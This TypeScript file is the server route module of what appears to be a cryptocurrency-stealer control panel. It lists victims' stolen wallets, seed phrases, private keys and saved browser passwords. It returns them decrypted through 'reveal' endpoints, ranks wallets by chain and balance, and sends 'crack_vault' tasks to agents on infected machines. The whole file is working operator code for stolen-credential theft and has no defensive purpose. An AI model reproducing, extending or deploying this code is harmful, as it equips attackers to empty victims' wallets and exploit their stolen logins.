import type { FastifyPluginAsync } from 'fastify';
import { z } from 'zod';
import { prisma } from '../lib/db';
import { audit } from '../lib/audit';
import { notFound } from '../lib/errors';
import { openSecret } from '../lib/crypto';
import { revealSecret, secretKindFor, hasBalance, balanceNumber } from '../services/vault';
import { requireRole } from '../plugins/auth';
import { dispatchCommand, hasControl } from './ws';
import { publish } from '../lib/bus';
import { bad } from '../lib/errors';

const blank = (schema: z.ZodTypeAny) => z.preprocess((value) => value === '' ? undefined : value, schema);
const pages = z.object({
  q: z.string().max(256).default(''),
  victim: blank(z.string().uuid().optional()),
  state: blank(z.string().max(32).optional()),
  cursor: blank(z.string().uuid().optional()),
  limit: z.coerce.number().int().min(1).max(200).default(50)
});

const MASK_KINDS = new Set(['seed', 'mnemonic', 'private_key', 'password', 'passphrase', 'keystore']);

function preview(kind: string, value: string, words: number | null): string {
  if (kind === 'seed' || kind === 'mnemonic') {
    const list = value.trim().split(/\s+/);
    return `${list.slice(0, 2).join(' ')} · ${'•'.repeat(6)} · ${list.at(-1) ?? ''}${words ? ` (${words} palabras)` : ''}`;
  }
  if (kind === 'password') return '••••••••';
  if (value.length <= 14) return `${value.slice(0, 4)}…`;
  return `${value.slice(0, 8)}…${value.slice(-4)}`;
}

function maskSecret(secret: { kind: string; valueEnc: string; words: number | null }) {
  let value = '';
  try {
    value = openSecret(secret.valueEnc);
  } catch {
    value = '';
  }
  const kind = secretKindFor(secret.kind, value, secret.words);
  return {
    kind,
    words: secret.words,
    preview: MASK_KINDS.has(kind) ? preview(kind, value, secret.words) : '••••',
    available: Boolean(value)
  };
}

function chainOf(targetId: string, address: string | null): 'evm' | 'btc' | 'sol' | 'other' {
  const target = targetId.toLowerCase();
  if (address?.startsWith('0x') || /metamask|rabby|coinbase|trust|tronlink|evm|exodus|okx|brave|zerion|rainbow|frame/.test(target)) return 'evm';
  if (address && /^(bc1|1|3)/.test(address)) return 'btc';
  if (address && /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(address)) return 'sol';
  if (/phantom|solflare|solana|backpack/.test(target)) return 'sol';
  return 'other';
}

export const vaultRoutes: FastifyPluginAsync = async (app) => {
  app.get('/victims/:id/vault', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const victim = await prisma.victim.findUnique({ where: { id }, select: { id: true, hostname: true } });
    if (!victim) throw notFound('victim');
    const [wallets, credentials, lastScan] = await Promise.all([
      prisma.wallet.findMany({
        where: { victimId: id },
        orderBy: [{ state: 'asc' }, { lastSeenAt: 'desc' }],
        take: 2000,
        include: {
          secrets: { orderBy: [{ kind: 'asc' }, { updatedAt: 'desc' }], select: { id: true, kind: true, valueEnc: true, words: true, confidence: true, updatedAt: true } }
        }
      }),
      prisma.credential.count({ where: { victimId: id } }),
      prisma.task.findFirst({
        where: { victimId: id, name: { in: ['scan_wallets', 'dump_vault', 'crack_vault'] } },
        orderBy: { createdAt: 'desc' },
        select: { name: true, status: true, createdAt: true, finishedAt: true, error: true }
      })
    ]);
    const groups = new Map<string, {
      targetId: string;
      label: string;
      kind: string;
      state: string;
      address: string | null;
      balance: string | null;
      balanceValue: number;
      seedFile: boolean;
      secretKinds: string[];
      lastSeenAt: Date;
      wallets: unknown[];
    }>();
    const rank: Record<string, number> = { decrypted: 6, found: 5, locked: 4, no_vault: 3, unsupported: 2, corrupt: 1, failed: 0 };
    const counters = { wallets: wallets.length, targets: 0, seeds: 0, keys: 0, passwords: 0, credentials, balances: 0 };
    for (const wallet of wallets) {
      const secrets = wallet.secrets.map((secret) => ({ ...maskSecret(secret), id: secret.id, confidence: secret.confidence, updatedAt: secret.updatedAt }));
      if (wallet.kind === 'seed_file' && !secrets.some((secret) => secret.kind === 'seed')) counters.seeds += 1;
      for (const secret of secrets) {
        if (secret.kind === 'seed') counters.seeds += 1;
        else if (secret.kind === 'private_key' || secret.kind === 'keystore') counters.keys += 1;
        else if (secret.kind === 'password' || secret.kind === 'passphrase') counters.passwords += 1;
      }
      if (hasBalance(wallet.balance)) counters.balances += 1;
      const group = groups.get(wallet.targetId) ?? {
        targetId: wallet.targetId,
        label: wallet.label ?? wallet.targetId,
        kind: wallet.kind,
        state: wallet.state,
        address: wallet.address,
        balance: wallet.balance,
        balanceValue: balanceNumber(wallet.balance),
        seedFile: wallet.kind === 'seed_file',
        secretKinds: [],
        lastSeenAt: wallet.lastSeenAt,
        wallets: []
      };
      if ((rank[wallet.state] ?? 0) > (rank[group.state] ?? 0)) group.state = wallet.state;
      if (!group.address && wallet.address) group.address = wallet.address;
      if (!group.balanceValue && hasBalance(wallet.balance)) {
        group.balance = wallet.balance;
        group.balanceValue = balanceNumber(wallet.balance);
      }
      if (wallet.kind === 'seed_file') group.seedFile = true;
      group.secretKinds = [...new Set([...group.secretKinds, ...secrets.map((secret) => secret.kind)])];
      group.lastSeenAt = group.lastSeenAt > wallet.lastSeenAt ? group.lastSeenAt : wallet.lastSeenAt;
      group.wallets.push({
        id: wallet.id,
        path: wallet.path,
        state: wallet.state,
        reason: wallet.reason,
        decryptError: wallet.decryptError,
        address: wallet.address,
        balance: wallet.balance,
        balanceValue: balanceNumber(wallet.balance),
        source: wallet.source,
        lastSeenAt: wallet.lastSeenAt,
        secretCount: wallet.secrets.length,
        secrets
      });
      groups.set(wallet.targetId, group);
    }
    counters.targets = groups.size;
    return { victim, groups: [...groups.values()], counters, lastScan };
  });

  app.get('/vault', async (request) => {
    const query = pages.extend({ chain: blank(z.enum(['evm', 'btc', 'sol', 'other']).optional()), balance: blank(z.enum(['0', '1']).optional()) }).parse(request.query);
    const rows = await prisma.wallet.findMany({
      where: {
        ...(query.victim ? { victimId: query.victim } : {}),
        ...(query.state ? { state: query.state as never } : {}),
        ...(query.q ? { OR: [{ targetId: { contains: query.q, mode: 'insensitive' } }, { address: { contains: query.q, mode: 'insensitive' } }, { victim: { hostname: { contains: query.q, mode: 'insensitive' } } }] } : {}),
        ...(query.balance === '1' ? { AND: [{ NOT: { balance: null } }] } : {})
      },
      orderBy: [{ lastSeenAt: 'desc' }, { id: 'asc' }],
      take: (query.chain || query.balance === '1' ? query.limit * 4 : query.limit) + 1,
      ...(query.cursor ? { cursor: { id: query.cursor }, skip: 1 } : {}),
      include: {
        victim: { select: { id: true, hostname: true, os: true } },
        _count: { select: { secrets: true } }
      }
    });
    const filtered = rows.filter((row) =>
      (!query.chain || chainOf(row.targetId, row.address) === query.chain) &&
      (query.balance !== '1' || hasBalance(row.balance)));
    const page = filtered.slice(0, query.limit);
    const groups = new Map<string, { key: string; targetId: string; chain: string; victim: { id: string; hostname: string; os: string }; wallets: typeof page }>();
    for (const wallet of page) {
      const key = `${wallet.victimId}:${wallet.targetId}`;
      const group = groups.get(key) ?? { key, targetId: wallet.targetId, chain: chainOf(wallet.targetId, wallet.address), victim: wallet.victim, wallets: [] };
      group.wallets.push(wallet);
      groups.set(key, group);
    }
    return {
      items: page.map((wallet) => ({ ...wallet, chain: chainOf(wallet.targetId, wallet.address), hasBalance: hasBalance(wallet.balance), balanceValue: balanceNumber(wallet.balance), secrets: wallet._count.secrets })),
      groups: [...groups.values()].map((group) => ({ ...group, count: group.wallets.length })),
      next: rows.length > page.length ? page.at(-1)?.id ?? null : null
    };
  });

  app.get('/vault/secrets', async (request) => {
    const query = z.object({
      kind: blank(z.enum(['seed', 'private_key']).optional()),
      victim: blank(z.string().uuid().optional()),
      q: z.string().max(256).default(''),
      limit: z.coerce.number().int().min(1).max(200).default(100)
    }).parse(request.query);
    const rows = await prisma.walletSecret.findMany({
      where: {
        ...(query.victim ? { wallet: { victimId: query.victim } } : {}),
        ...(query.q ? { OR: [
          { wallet: { targetId: { contains: query.q, mode: 'insensitive' } } },
          { wallet: { path: { contains: query.q, mode: 'insensitive' } } },
          { wallet: { victim: { hostname: { contains: query.q, mode: 'insensitive' } } } }
        ] } : {})
      },
      orderBy: [{ updatedAt: 'desc' }, { id: 'asc' }],
      take: 1200,
      include: {
        wallet: { select: { id: true, targetId: true, kind: true, path: true, state: true, victim: { select: { id: true, hostname: true } } } }
      }
    });
    const items = [];
    for (const row of rows) {
      const masked = maskSecret(row);
      if (query.kind === 'seed' && masked.kind !== 'seed' && row.wallet.kind !== 'seed_file') continue;
      if (query.kind === 'private_key' && masked.kind !== 'private_key' && masked.kind !== 'keystore') continue;
      items.push({
        id: row.id,
        kind: masked.kind,
        preview: masked.preview,
        words: row.words,
        confidence: row.confidence,
        source: row.source,
        updatedAt: row.updatedAt,
        wallet: { id: row.wallet.id, targetId: row.wallet.targetId, kind: row.wallet.kind, path: row.wallet.path, state: row.wallet.state },
        victim: row.wallet.victim
      });
      if (items.length > query.limit) break;
    }
    return { items: items.slice(0, query.limit), next: items.length > query.limit };
  });

  app.get('/vault/wallets/:walletId', async (request) => {
    const { walletId } = z.object({ walletId: z.string().uuid() }).parse(request.params);
    const wallet = await prisma.wallet.findUnique({
      where: { id: walletId },
      include: {
        victim: { select: { id: true, hostname: true, os: true, username: true } },
        secrets: { orderBy: [{ kind: 'asc' }, { updatedAt: 'desc' }] }
      }
    });
    if (!wallet) throw notFound('wallet');
    const credentials = await prisma.credential.findMany({
      where: { victimId: wallet.victimId, ...(wallet.kind === 'creds' ? { targetId: wallet.targetId } : {}) },
      orderBy: { updatedAt: 'desc' },
      take: 100
    });
    return {
      ...wallet,
      secrets: wallet.secrets.map((secret) => ({
        ...maskSecret(secret),
        id: secret.id,
        confidence: secret.confidence,
        firstSeenAt: secret.firstSeenAt,
        updatedAt: secret.updatedAt
      })),
      credentials: credentials.map((row) => ({ ...row, passwordEnc: undefined, hasPassword: Boolean(row.passwordEnc) }))
    };
  });

  app.get('/vault/wallets/:walletId/reveal', async (request, reply) => {
    const { walletId } = z.object({ walletId: z.string().uuid() }).parse(request.params);
    const query = z.object({
      kind: z.string().max(32).optional(),
      secretId: z.string().uuid().optional()
    }).parse(request.query);
    const wallet = await prisma.wallet.findUnique({ where: { id: walletId }, select: { id: true, victimId: true, targetId: true } });
    if (!wallet) throw notFound('wallet');
    const secret = await revealSecret(walletId, query.kind, query.secretId).catch(() => {
      throw bad('decrypt_failed', 'no se pudo descifrar el secreto', 409);
    });
    if (!secret) throw notFound('secret');
    const effective = secret.kind ? secretKindFor(secret.kind, secret.value, secret.words) : 'secret';
    await prisma.$transaction(async (tx) => {
      await audit(tx, {
        operatorId: request.operator?.id,
        action: 'vault.reveal',
        entity: 'wallet_secret',
        entityId: secret.id,
        ip: request.clientIp,
        data: { walletId, kind: effective, victimId: wallet.victimId }
      });
    });
    reply.header('cache-control', 'no-store');
    return { walletId, kind: effective, value: secret.value, words: secret.words };
  });

  app.post('/vault/wallets/:walletId/retry', { preHandler: requireRole('operator') }, async (request, reply) => {
    const { walletId } = z.object({ walletId: z.string().uuid() }).parse(request.params);
    const wallet = await prisma.wallet.findUnique({ where: { id: walletId }, include: { victim: { select: { id: true, revokedAt: true } } } });
    if (!wallet) throw notFound('wallet');
    if (wallet.victim.revokedAt) throw bad('revoked', 'victim is revoked', 409);
    if (!hasControl(wallet.victimId)) throw bad('agent_offline', 'victim has no control socket', 409);
    const task = await prisma.$transaction(async (tx) => {
      const created = await tx.task.create({
        data: { victimId: wallet.victimId, name: 'crack_vault', params: { target: wallet.targetId, max_seconds: 120 } as never, timeoutSec: 180, createdById: request.operator!.id }
      });
      await audit(tx, {
        operatorId: request.operator?.id,
        action: 'vault.retry',
        entity: 'wallet',
        entityId: wallet.id,
        ip: request.clientIp,
        data: { task: created.id, victimId: wallet.victimId }
      });
      return created;
    });
    const delivered = await dispatchCommand(task).catch(() => false);
    if (!delivered) {
      await prisma.task.updateMany({ where: { id: task.id, status: 'queued' }, data: { status: 'error', error: 'agent_offline', finishedAt: new Date(), leaseUntil: null } });
    }
    void publish({ type: 'task.update', victimId: wallet.victimId, at: Date.now(), data: { id: task.id, name: 'crack_vault', status: delivered ? 'queued' : 'error' } });
    return reply.code(201).send({ ok: true, taskId: task.id, delivered });
  });

  app.get('/vault/credentials', async (request) => {
    const query = pages.extend({ target: z.string().max(512).optional() }).parse(request.query);
    const rows = await prisma.credential.findMany({
      where: {
        ...(query.victim ? { victimId: query.victim } : {}),
        ...(query.target ? { targetId: query.target } : {}),
        ...(query.state ? { state: query.state } : {}),
        ...(query.q ? { OR: [{ url: { contains: query.q, mode: 'insensitive' } }, { username: { contains: query.q, mode: 'insensitive' } }, { victim: { hostname: { contains: query.q, mode: 'insensitive' } } }] } : {})
      },
      orderBy: [{ updatedAt: 'desc' }, { id: 'asc' }],
      take: query.limit + 1,
      ...(query.cursor ? { cursor: { id: query.cursor }, skip: 1 } : {}),
      include: { victim: { select: { id: true, hostname: true } } }
    });
    const items = rows.slice(0, query.limit).map((row) => ({ ...row, passwordEnc: undefined, hasPassword: Boolean(row.passwordEnc), passwordPreview: row.passwordEnc ? '••••••••' : '—' }));
    return { items, next: rows.length > query.limit ? rows.at(-1)?.id ?? null : null };
  });

  app.get('/victims/:id/credentials', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const query = pages.parse(request.query);
    const rows = await prisma.credential.findMany({
      where: {
        victimId: id,
        ...(query.state ? { state: query.state } : {}),
        ...(query.q ? { OR: [{ url: { contains: query.q, mode: 'insensitive' } }, { username: { contains: query.q, mode: 'insensitive' } }] } : {})
      },
      orderBy: [{ updatedAt: 'desc' }, { id: 'asc' }],
      take: query.limit + 1,
      ...(query.cursor ? { cursor: { id: query.cursor }, skip: 1 } : {})
    });
    const items = rows.slice(0, query.limit).map((row) => ({ ...row, passwordEnc: undefined, hasPassword: Boolean(row.passwordEnc), passwordPreview: row.passwordEnc ? '••••••••' : '—' }));
    return { items, next: rows.length > query.limit ? rows.at(-1)?.id ?? null : null };
  });

  app.get('/vault/credentials/:id/reveal', async (request, reply) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const row = await prisma.credential.findUnique({ where: { id } });
    if (!row || !row.passwordEnc) throw notFound('credential');
    let value: string;
    try {
      value = openSecret(row.passwordEnc);
    } catch {
      throw bad('decrypt_failed', 'no se pudo descifrar la contraseña', 409);
    }
    await prisma.$transaction(async (tx) => {
      await audit(tx, {
        operatorId: request.operator?.id,
        action: 'vault.credential_reveal',
        entity: 'credential',
        entityId: row.id,
        ip: request.clientIp,
        data: { victimId: row.victimId, targetId: row.targetId }
      });
    });
    reply.header('cache-control', 'no-store');
    return { id: row.id, value };
  });
};
